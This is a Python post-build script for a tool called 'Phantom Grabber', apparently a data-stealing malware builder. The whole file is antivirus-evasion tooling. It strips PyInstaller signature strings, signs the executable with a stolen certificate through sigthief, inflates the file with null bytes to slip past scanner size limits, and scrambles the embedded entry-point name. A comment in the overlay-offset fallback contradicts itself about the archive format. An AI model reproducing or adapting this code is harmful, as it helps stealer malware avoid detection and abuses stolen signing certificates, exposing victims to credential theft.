# Phantom Grabber — Post-Build Processing
# Removes PyInstaller signatures, applies stolen certificate,
# pumps file size, and renames the embedded entry point.

import os
import sys
import random
import struct
import logging

logger = logging.getLogger("PostProcess")
logging.basicConfig(level=logging.INFO, format="[%(name)s] %(message)s")


def RemoveMetaData(path: str) -> None:
    """Scrub PyInstaller signature strings from the built executable."""
    logger.info(f"Removing PyInstaller metadata from {path}")

    with open(path, "rb") as f:
        data = bytearray(f.read())

    replacements = [
        (b"PyInstaller:", b"PyInstallem:"),
        (b"pyi-runtime-tmpdir", b"bye-runtime-tmpdir"),
        (b"pyi-windows-manifest-filename", b"bye-windows-manifest-filename"),
    ]

    for old, new in replacements:
        idx = 0
        count = 0
        while True:
            pos = data.find(old, idx)
            if pos == -1:
                break
            data[pos:pos + len(old)] = new
            idx = pos + len(new)
            count += 1
        if count > 0:
            logger.info(f"  Replaced {count} occurrence(s) of {old}")

    with open(path, "wb") as f:
        f.write(data)


def AddCertificate(path: str) -> None:
    """If a stolen certificate file exists, apply it to the executable."""
    cert_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cert")
    if not os.path.isfile(cert_file):
        logger.info("No certificate file found, skipping.")
        return

    try:
        import sigthief
        result = sigthief.signfile(path, cert_file, path)
        if result:
            logger.info("Certificate applied successfully.")
        else:
            logger.warning("Certificate application returned False.")
    except Exception as exc:
        logger.warning(f"Certificate application failed: {exc}")


def PumpStub(path: str, pumpFile: str) -> None:
    """Insert null bytes before the PyInstaller overlay to inflate file size."""
    pump_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), pumpFile)
    if not os.path.isfile(pump_path):
        logger.info("No pump file found, skipping size inflation.")
        return

    with open(pump_path, "r") as f:
        try:
            pump_size_mb = int(f.read().strip())
        except ValueError:
            logger.warning("Invalid pump size value.")
            return

    if pump_size_mb <= 0:
        return

    pump_bytes = pump_size_mb * 1024 * 1024
    logger.info(f"Pumping executable by {pump_size_mb} MB ({pump_bytes} bytes)")

    # Find the PyInstaller overlay start offset
    overlay_offset = _find_overlay_offset(path)
    if overlay_offset is None:
        logger.warning("Could not find PyInstaller overlay offset; appending null bytes at end.")
        with open(path, "ab") as f:
            # Write in chunks to avoid memory issues
            chunk_size = 1024 * 1024
            remaining = pump_bytes
            while remaining > 0:
                write_size = min(chunk_size, remaining)
                f.write(b"\x00" * write_size)
                remaining -= write_size
        return

    # Read the file, insert nulls before overlay
    with open(path, "rb") as f:
        pre_overlay = f.read(overlay_offset)
        overlay_data = f.read()

    with open(path, "wb") as f:
        f.write(pre_overlay)
        # Write null padding in chunks
        chunk_size = 1024 * 1024
        remaining = pump_bytes
        while remaining > 0:
            write_size = min(chunk_size, remaining)
            f.write(b"\x00" * write_size)
            remaining -= write_size
        f.write(overlay_data)

    logger.info(f"Executable pumped. New size: {os.path.getsize(path)} bytes")


def _find_overlay_offset(path: str) -> int | None:
    """Find the PyInstaller CArchive start offset in a built executable."""
    try:
        from PyInstaller.archive.readers import CArchiveReader
        archive = CArchiveReader(path)
        offset = archive._start_offset
        logger.info(f"PyInstaller overlay found at offset {offset}")
        return offset
    except Exception as exc:
        logger.warning(f"CArchiveReader failed: {exc}")

    # Fallback: search for the MAGIC pattern
    try:
        with open(path, "rb") as f:
            data = f.read()
        # PyInstaller's CArchive magic: "MEI\014\013\012\013\016"
        magic = b"MEI\x0c\x0b\x0a\x0b\x0e"
        pos = data.rfind(magic)
        if pos != -1:
            # The cookie is 88 bytes before the magic in recent PyInstaller
            # Actually the MAGIC is at the cookie start, offset is 24 bytes in
            cookie_pos = pos
            # Read the package_length from the cookie to compute start
            if len(data) >= cookie_pos + 88:
                # The cookie structure: magic(8) + pkg_len(4) + toc_offset(4) + toc_len(4) + ...
                pkg_len = struct.unpack("<I", data[cookie_pos + 8:cookie_pos + 12])[0]
                start_offset = len(data) - pkg_len
                if 0 < start_offset < len(data):
                    logger.info(f"PyInstaller overlay found via magic at offset {start_offset}")
                    return start_offset
        logger.warning("PyInstaller magic pattern not found.")
    except Exception as exc:
        logger.warning(f"Overlay search failed: {exc}")

    return None


def RenameEntryPoint(path: str, entryPoint: str) -> None:
    """Replace the entry point name bytes with null + random bytes to obscure it."""
    logger.info(f"Renaming entry point '{entryPoint}' in {path}")

    entry_bytes = entryPoint.encode("utf-8")

    with open(path, "rb") as f:
        data = bytearray(f.read())

    # Find and replace all occurrences of the entry point name
    idx = 0
    count = 0
    while True:
        pos = data.find(entry_bytes, idx)
        if pos == -1:
            break

        # Replace with null byte + random ASCII bytes
        replacement = b"\x00" + bytes(
            random.randint(0x41, 0x5A) for _ in range(len(entry_bytes) - 1)
        )
        data[pos:pos + len(entry_bytes)] = replacement
        idx = pos + len(replacement)
        count += 1

    if count > 0:
        with open(path, "wb") as f:
            f.write(data)
        logger.info(f"  Replaced {count} occurrence(s) of entry point name")
    else:
        logger.info("  Entry point name not found in binary (may already be obfuscated)")


if __name__ == "__main__":
    components_dir = os.path.dirname(os.path.abspath(__file__))
    built_file = os.path.join(components_dir, "dist", "Built.exe")

    if os.path.isfile(built_file):
        logger.info(f"Post-processing {built_file}")
        RemoveMetaData(built_file)
        AddCertificate(built_file)
        PumpStub(built_file, "pumpStub")
        RenameEntryPoint(built_file, "loader-o")
        logger.info("Post-processing complete.")
    else:
        logger.error(f"Built executable not found: {built_file}")
        sys.exit(1)
